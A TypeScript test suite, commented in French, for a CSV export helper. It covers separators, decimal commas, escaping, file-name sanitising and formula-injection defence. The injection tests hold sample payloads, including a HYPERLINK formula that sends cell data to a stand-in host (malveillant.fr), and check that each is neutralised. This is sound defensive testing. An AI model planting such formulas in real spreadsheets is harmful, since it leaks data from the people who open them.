import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import { buildCsv, csvFileName, type CsvColumn } from '../src/lib/csv'

interface Row {
  produit: string
  ca: number | null
  marge: number | null
}

const COLUMNS: CsvColumn<Row>[] = [
  { header: 'Produit', value: (row) => row.produit },
  { header: 'CA HT (€)', value: (row) => row.ca },
  { header: 'Marge (%)', value: (row) => row.marge },
]

const META = {
  title: 'Produits et marges',
  period: 'Janv. 2026 – Déc. 2026',
  filters: 'Aucun filtre',
  syncedAt: '18 août 2026 à 14:32',
}

function lines(csv: string): string[] {
  return csv.split('\r\n')
}

describe('structure du fichier', () => {
  const csv = buildCsv([{ produit: 'Sérum', ca: 1234.5, marge: 0.62 }], COLUMNS, META)

  test('le bloc de contexte précède les données', () => {
    // Un CSV circule par courriel : sans période ni horodatage, il devient
    // impossible de savoir ce qu'on regarde.
    const rows = lines(csv)
    assert.equal(rows[0], 'Produits et marges')
    assert.ok(rows.some((line) => line.includes('Période')))
    assert.ok(rows.some((line) => line.includes('Données synchronisées')))
    assert.ok(rows.some((line) => line.includes('Confidentialité')))
  })

  test('mention de confidentialité par défaut', () => {
    assert.match(csv, /Document confidentiel/)
  })

  test('séparateur point-virgule, adapté au format français', () => {
    // La virgule est le séparateur décimal en fr-FR : elle ne peut pas
    // servir aussi de séparateur de colonnes.
    assert.ok(csv.includes('Produit;CA HT (€);Marge (%)'))
  })

  test('fin de ligne CRLF', () => {
    assert.ok(csv.includes('\r\n'))
  })

  test('en-têtes de colonnes présents', () => {
    const rows = lines(csv)
    const headerIndex = rows.findIndex((line) => line.startsWith('Produit;'))
    assert.ok(headerIndex > 0)
    assert.equal(rows[headerIndex + 1], 'Sérum;1234,5;0,62')
  })
})

describe('formatage des valeurs', () => {
  test('virgule décimale', () => {
    const csv = buildCsv([{ produit: 'A', ca: 1234.56, marge: 0.6 }], COLUMNS, META)
    assert.ok(csv.includes('1234,56'))
  })

  test('valeur absente : cellule vide, jamais un zéro', () => {
    const csv = buildCsv([{ produit: 'A', ca: null, marge: null }], COLUMNS, META)
    assert.ok(csv.includes('A;;'))
  })

  test('valeurs non finies traitées comme absentes', () => {
    const csv = buildCsv(
      [{ produit: 'A', ca: Number.NaN, marge: Number.POSITIVE_INFINITY }],
      COLUMNS,
      META,
    )
    assert.ok(csv.includes('A;;'))
  })
})

describe('échappement', () => {
  test('le séparateur contenu dans une valeur est protégé', () => {
    const csv = buildCsv([{ produit: 'Sérum; 30 ml', ca: 1, marge: 1 }], COLUMNS, META)
    assert.ok(csv.includes('"Sérum; 30 ml"'))
  })

  test('les guillemets sont doublés', () => {
    const csv = buildCsv([{ produit: 'Sérum "Éclat"', ca: 1, marge: 1 }], COLUMNS, META)
    assert.ok(csv.includes('"Sérum ""Éclat"""'))
  })

  test('les retours à la ligne sont encadrés', () => {
    const csv = buildCsv([{ produit: 'Ligne 1\nLigne 2', ca: 1, marge: 1 }], COLUMNS, META)
    assert.ok(csv.includes('"Ligne 1\nLigne 2"'))
  })
})

describe('injection de formule', () => {
  // Excel et Google Sheets interprètent une cellule commençant par =, +, - ou @
  // comme une formule. Un nom de produit malveillant deviendrait exécutable
  // à l'ouverture du fichier exporté.
  test('les préfixes exécutables sont neutralisés', () => {
    for (const dangerous of ['=1+1', '+SUM(A1)', '-2+3', '@SUM(A1)']) {
      const csv = buildCsv([{ produit: dangerous, ca: 1, marge: 1 }], COLUMNS, META)
      assert.ok(csv.includes(`'${dangerous}`), `préfixe non neutralisé : ${dangerous}`)
    }
  })

  test('cas classique d’exfiltration', () => {
    const payload = '=HYPERLINK("http://malveillant.fr?d="&A1,"cliquez")'
    const csv = buildCsv([{ produit: payload, ca: 1, marge: 1 }], COLUMNS, META)
    // Neutralisé par l'apostrophe, et encadré car il contient un séparateur.
    assert.ok(csv.includes("'=HYPERLINK"))
  })

  test('un texte ordinaire n’est pas altéré', () => {
    const csv = buildCsv([{ produit: 'Sérum Éclat', ca: 1, marge: 1 }], COLUMNS, META)
    assert.ok(csv.includes('Sérum Éclat'))
    assert.ok(!csv.includes("'Sérum"))
  })
})

describe('nom de fichier', () => {
  const date = new Date('2026-08-18T12:00:00Z')

  test('assaini, horodaté et sans accent', () => {
    assert.equal(csvFileName('Produits & Marges', date), 'produits-marges-2026-08-18.csv')
    assert.equal(csvFileName('Budget vs Réel', date), 'budget-vs-reel-2026-08-18.csv')
  })

  test('aucun caractère interdit ne subsiste', () => {
    const name = csvFileName('a/b\\c:d*e?f"g<h>i|j', date)
    assert.ok(!/[/\\:*?"<>|]/.test(name), `caractère interdit dans « ${name} »`)
  })
})

describe('jeu de données vide', () => {
  test('l’en-tête reste exploitable', () => {
    const csv = buildCsv([], COLUMNS, META)
    assert.ok(csv.includes('Produit;CA HT (€);Marge (%)'))
  })
})
